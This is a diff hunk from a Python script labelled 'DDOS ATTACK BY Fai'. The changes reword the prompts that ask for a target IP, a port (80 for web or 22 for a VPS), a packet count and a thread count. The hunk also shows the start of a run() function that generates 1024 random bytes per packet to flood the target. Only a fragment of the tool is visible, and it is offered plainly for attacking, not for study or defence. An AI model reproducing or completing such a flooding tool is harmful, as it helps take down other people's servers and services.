@@ -45,11 +45,11 @@ else :
 
 
 print(" DDOS ATTACK BY Fai ")
-ip= str(input(" HOST/IP:"))
-port= int(input("HOST/PORT :"))
+ip= str(input(" HOST/IP :"))
+port= int(input("PORT WEB 80/PORT VPS 22:"))
 choice = str(input("ATTACK/HOST?? (Y/N) :"))
-times= int(input("PACKETS  :"))
-threads= int(input("THREADS  :"))
+times= int(input("PACKETS MIN 100:"))
+threads= int(input("THREADS MIN 110 :"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[-]","[•]","[×]"))
